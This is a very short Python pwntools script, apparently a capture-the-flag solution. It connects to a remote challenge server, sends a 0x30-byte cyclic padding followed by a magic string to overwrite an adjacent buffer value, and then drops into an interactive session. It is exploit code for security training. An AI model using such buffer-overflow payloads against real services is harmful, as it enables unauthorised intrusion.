from pwn import *


p = remote("node4.buuoj.cn", 29731)

pad = cyclic(0x30)+b"n0t_r3@11y_f1@g"
p.sendline(pad)

p.interactive()

